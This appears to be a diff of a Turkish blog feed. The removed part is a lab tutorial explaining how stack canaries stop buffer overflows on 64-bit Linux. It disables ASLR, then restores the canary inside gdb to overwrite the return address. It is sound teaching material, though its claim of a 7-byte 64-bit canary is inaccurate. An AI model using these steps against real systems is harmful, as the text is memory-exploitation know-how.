-&lt;p&gt;&lt;strong&gt;ASLR&lt;/strong&gt;‘yi disable etmek için bu command line kodu kullanalım :&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h1 id=&quot;yavaştan-analize-başlayalım-ve-stack-canaryi-daha-iyi-anlayalım&quot;&gt;Yavaştan analize başlayalım ve stack canary’i daha iyi anlayalım&lt;/h1&gt;
-
-&lt;p&gt;Yukarıdakileri yaptıktan sonra programı aşşağıda ki gibi çalıştıralım ve çıkacak sonuca bakalım :&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@ubuntu:~# ./canary AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-*** stack smashing detected ***: &amp;lt;unknown&amp;gt; terminated
-Aborted (core dumped)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Buffer alanımız 64 olduğu için 64’ten daha büyük bir byte sayısı verdiğimiz de program crash oluyor fakat bu normal bir crash değil. Normal de hatırlarsanız &lt;strong&gt;Segmentation fault&lt;/strong&gt; çıktısını alıyorduk.&lt;/p&gt;
-
-&lt;p&gt;Bu sefer “Stack Smashing Detected” Çıktısını aldık. Bu bizim &lt;strong&gt;Stack Canary&lt;/strong&gt;‘mizin güvenlik önlemi. Şimdi assembly içerisinde biraz daha detaylı inceleyelim :&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://i.imgur.com/RgGDoqL.png&quot;&gt;Disassemble Edilmiş ./canary&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Yukarıda ki fotorafa girdiğimiz de normal bir program akışı dışın da programın içerisinde bulunan bir kaç kod parçacığı görebiliyoruz. Bunlardan biri :&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x0000000000401151 &amp;lt;+15&amp;gt;:    mov    rax,QWORD PTR fs:0x28
-0x000000000040115a &amp;lt;+24&amp;gt;:    mov    QWORD PTR [rbp-0x8],rax
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Bir diğeri ise :&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x0000000000401190 &amp;lt;+78&amp;gt;:    mov    rcx,QWORD PTR [rbp-0x8]
-0x0000000000401194 &amp;lt;+82&amp;gt;:    xor    rcx,QWORD PTR fs:0x28
-0x000000000040119d &amp;lt;+91&amp;gt;:    je     0x4011a4 &amp;lt;main+98&amp;gt;
-0x000000000040119f &amp;lt;+93&amp;gt;:    call   0x401040 &amp;lt;__stack_chk_fail@plt&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Başta yazdığımız küçük python kodunu hatırladınızmı ? Aslında burada dönen olay oradakiyle tam aynı.&lt;/p&gt;
-
-&lt;p&gt;64 bit bir işletim sistemi kullandığımızdan &lt;strong&gt;FS&lt;/strong&gt; flaginin içerisinden 0x28 offsetini &lt;strong&gt;RAX&lt;/strong&gt; registerine movluyor. Peki bu &lt;strong&gt;FS&lt;/strong&gt; registerinin 0x28 içerisinde ne var ?&lt;/p&gt;
-
-&lt;p&gt;Tabiki de bizim &lt;strong&gt;Stack Cookie&lt;/strong&gt;‘miz olan &lt;strong&gt;0x24582bb086d7a100&lt;/strong&gt; :&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ x/x $rax
-0x24582bb086d7a100:     Cannot access memory at address 0x24582bb086d7a100
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Unutmayalım ki 64 bit sistemler de &lt;strong&gt;Stack Cookie&lt;/strong&gt;‘sinin uzunluğu 7 byte’tır. 32 Bit sistemler de ise bu 4 bytetır ve bunların ikisi de bakın burası çok önemli &lt;strong&gt;00&lt;/strong&gt; ile başlar.&lt;/p&gt;
-
-&lt;p&gt;Python kodunda da olduğu gibi şuan da cookieyi cookie_backup değişkenine aktardık.&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;Kod parçacığı olan kısım ise bu cookie hala aynımı değilmi testidir.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x401190 &amp;lt;main+78&amp;gt;:  mov    rcx,QWORD PTR [rbp-0x8]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Bu kısım ile rbp-0x8’de bulunan &lt;strong&gt;Stack Cookie&lt;/strong&gt;‘sini &lt;strong&gt;RCX&lt;/strong&gt; registerine atıyoruz.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x401194 &amp;lt;main+82&amp;gt;:  xor    rcx,QWORD PTR fs:0x28
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;XOR&lt;/strong&gt; ile de bu &lt;strong&gt;Stack Cookie&lt;/strong&gt;‘sinin değiştirilip değiştirilmediğine bakıyoruz.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x40119d &amp;lt;main+91&amp;gt;:  je     0x4011a4 &amp;lt;main+98&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Eğer değiştirilmediyse program akışını normal şekil de devam ettir.&lt;/p&gt;
-
-&lt;p&gt;Değiştirilmediyse :&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x000000000040119f &amp;lt;+93&amp;gt;:    call   0x401040 &amp;lt;__stack_chk_fail@plt&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;__stack_chk_fail fonksiyonunu çağır.&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Bu fonksiyon da bizi programdan atıp exit(0) fonksiyonunu çağırıp programdan çıkıyor. Ekranada “Stack Smashin Detected” yazdırıyor.&lt;/p&gt;
-
-&lt;p&gt;Yani buradaki en önemli kısım olan :&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Buffer alanını deldiğimiz sırada cookie’nin üzerine de yazdığımızdan program bir iş karıştırdığımızı anlıyor ve çıkış yapıp ekrana stack’i ezmeye çalıştığımızı yazıyor.&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Yani biz &lt;strong&gt;EIP&lt;/strong&gt; registerinin üzerine yazalım derken &lt;strong&gt;Stack Cookie&lt;/strong&gt;‘sinin de üzerine yazıyoruz ve &lt;strong&gt;__stack_chk_fail&lt;/strong&gt; fonksiyonu bu değişikliği görüp birşeyler yapmaya çalıştığımızı anlayıp programdan &lt;strong&gt;exit(0)&lt;/strong&gt; fonksiyonu ile çıkış yapıyor.&lt;/p&gt;
-
-&lt;p&gt;Gnu Debugger ile programa &lt;strong&gt;92&lt;/strong&gt; byte verelim. Normal de &lt;strong&gt;92&lt;/strong&gt; byte’ta &lt;strong&gt;EIP&lt;/strong&gt; registerinin üzerine yazıp shellcode’un adresini verebilmemiz lazımdı fakat çalıştırdığımız da :&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/Q444cqe.png&quot; alt=&quot;Can't overwrite EIP&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Görebiliriz ki &lt;strong&gt;EIP&lt;/strong&gt; üzerine yazamıyoruz çünkü &lt;strong&gt;Stack Cookie&lt;/strong&gt;‘sinin üzerine yazdık ve &lt;strong&gt;__stack_chk_fail&lt;/strong&gt; bunu görüp programı durdurdu ve ekrana “&lt;em&gt;** Stack Smash Detected **&lt;/em&gt;” yazısını yazdı.&lt;/p&gt;
-
-&lt;h1 id=&quot;stack-canarynin-bypass-edilme-tekniği&quot;&gt;Stack Canary’nin bypass edilme tekniği&lt;/h1&gt;
-
-&lt;p&gt;&lt;strong&gt;Stack Canary&lt;/strong&gt;‘nin ne olduğunu iyice kavradığımıza göre yavaştan bypass edilmesine geçelim.&lt;/p&gt;
-
-&lt;p&gt;Bypass tekniği olmadan neler olduğunu yukarı da gördük şimdi eip yani return adresini değiştirmemiz için nasıl bypass edileceğini açıklayalım.&lt;/p&gt;
-
-&lt;p&gt;Öncelikle programa tekrar &lt;strong&gt;88&lt;/strong&gt; bytelık &lt;strong&gt;A&lt;/strong&gt; harfini verelim ve geri kalan 4 byte’ı da &lt;strong&gt;B&lt;/strong&gt; ile dolduralım ve eip üzerine &lt;strong&gt;B&lt;/strong&gt;‘leri nasıl ekleyeceğimizi görelim &lt;strong&gt;Stack Canary&lt;/strong&gt;‘i bypass edip.&lt;/p&gt;
-
-&lt;p&gt;GDB ile bu kısıma geldiğimiz de:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x401151 &amp;lt;main+15&amp;gt;:  mov    rax,QWORD PTR fs:0x28
-0x40115a &amp;lt;main+24&amp;gt;:  mov    QWORD PTR [rbp-0x8],rax
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;RAX&lt;/strong&gt; registerine aktarılan &lt;strong&gt;Cookie&lt;/strong&gt; değerini alıp saklamamız gerek. Yani notepade yazın, chrome’de yeni sekme oluşturun yazın yada aklınızda tutun ama bir yerde tutun o adresi :&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;x/x $rax&lt;/strong&gt; komutu ile &lt;strong&gt;gdb&lt;/strong&gt; içerisinde &lt;strong&gt;Cookie&lt;/strong&gt; değerini aldım ben &lt;strong&gt;0x3169b6a3c855be00&lt;/strong&gt;. 64 Bit olduğu için 7 byte uzunlıkta ve &lt;strong&gt;00&lt;/strong&gt; ile başlıyor.&lt;/p&gt;
-
-&lt;p&gt;Şimdi adresi aldığımıza göre 2. kısmımıza geçelim ve &lt;strong&gt;RCX&lt;/strong&gt; registerinin değeri yani &lt;strong&gt;Cookie&lt;/strong&gt;‘mizin değeri büyük ihtimal &lt;strong&gt;B&lt;/strong&gt;‘ler ve &lt;strong&gt;A&lt;/strong&gt;‘lar ile kaplanmış olucaktır. &lt;strong&gt;__stack_chk_fail&lt;/strong&gt; kısmına gelmeden &lt;strong&gt;breakpoint&lt;/strong&gt; ile duralım yani bu kısımda :&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=&amp;gt; 0x401194 &amp;lt;main+82&amp;gt;:  xor    rcx,QWORD PTR fs:0x28
-0x40119d &amp;lt;main+91&amp;gt;:  je     0x4011a4 &amp;lt;main+98&amp;gt;
-0x40119f &amp;lt;main+93&amp;gt;:  call   0x401040 &amp;lt;__stack_chk_fail@plt&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Bir adım ilerleyelim ve &lt;strong&gt;RCX&lt;/strong&gt; registerinin değerine bakalım :&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ x/x $rcx
-0x4141414141414141:     Cannot access memory at address 0x4141414141414141
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Görebiliyoruz ki &lt;strong&gt;Cookie&lt;/strong&gt; değerimiz &lt;strong&gt;A&lt;/strong&gt; harfi ile dolmuş ve &lt;strong&gt;_stack_chk_fail&lt;/strong&gt; bu &lt;strong&gt;Cookie&lt;/strong&gt; değerinin değiştiğini görecektir bu yüzden bizim başta sakladığımız cookie değerini tekrar &lt;strong&gt;RCX&lt;/strong&gt; registerine vermemiz gerekiyor.&lt;/p&gt;
-
-&lt;p&gt;Şu şekilde verelim hemen :&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$  set $rcx = 0x3169b6a3c855be00
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ve tekrardan bakalım &lt;strong&gt;Cookie&lt;/strong&gt; değerimiz verildimi diye :&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ x/x $rcx
-0x3169b6a3c855be00:     Cannot access memory at address 0x3169b6a3c855be00
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;Cookie&lt;/strong&gt; değerimiz eski haline döndü ve programdan artık çıkış yapılmayacaktır. Bizde &lt;strong&gt;EIP&lt;/strong&gt; registerinin üzerine basit bir şekilde yazabiliriz bundan sonra :&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://i.imgur.com/kSwv6YW.png&quot;&gt;EIP Resim&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;ve gördüğünüz gibi &lt;strong&gt;EIP&lt;/strong&gt; registerinin üzerine yani return addresinin üzerine &lt;strong&gt;B&lt;/strong&gt; harflerimizi yerleştirdik tabi bu bir örnek oraya normal de shellcodeumuzun adresi geliyor.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;GDB&lt;/strong&gt; içerisin de yukarıdaki adımları takip etmeniz çok önemli.&lt;/p&gt;
-
-&lt;p&gt;Okuduğunuz için çok teşekkürler umarım yardımcı olabilmişimdir. Sorularınız varsa veya herhangi bir hata gördüyseniz lütfen bana twitter hesabım olan @0DAYanc’tan yazmaya çekinmeyin. Bir Sonraki Yazıda Görüşmek Üzere !&lt;/p&gt;</content><author><name></name></author><summary type="html">Yazımıza geçmeden önce ben videodan daha iyi öğrenirim diyen arkadaşlar için youtube’da çektiğim videoya alalım sizleri : Video</summary></entry></feed>
+&lt;p&gt;Umarım yazıyı beğenmişsinizdir ve açıklayabilmişimdir &lt;strong&gt;Function Hooking&lt;/strong&gt;, &lt;strong&gt;Load-Time&lt;/strong&gt;, &lt;strong&gt;LD_PRELOAD&lt;/strong&gt; vs.. gibi terimleri. İyi günler.&lt;/p&gt;</content><author><name></name></author><summary type="html">Linux Load-Time Function Hooking</summary></entry></feed>
